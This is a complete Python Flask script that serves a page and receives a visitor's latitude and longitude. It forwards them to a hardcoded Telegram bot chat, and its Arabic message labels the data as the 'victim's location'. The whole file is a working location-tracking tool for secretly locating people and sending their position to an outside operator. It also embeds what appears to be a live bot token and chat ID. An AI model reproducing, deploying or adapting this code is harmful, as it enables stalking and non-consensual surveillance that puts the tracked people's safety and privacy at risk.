from flask import Flask, render_template, request
import requests

app = Flask(__name__)

BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"
CHAT_ID = "7485197107"

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/send-location", methods=["POST"])
def send_location():
    lat = request.form.get("latitude")
    lon = request.form.get("longitude")
    if lat and lon:
        msg = f"موقع الضحية:\nLatitude: {lat}\nLongitude: {lon}"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": msg})
        return "تم إرسال الموقع بنجاح"
    return "فشل إرسال الموقع"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
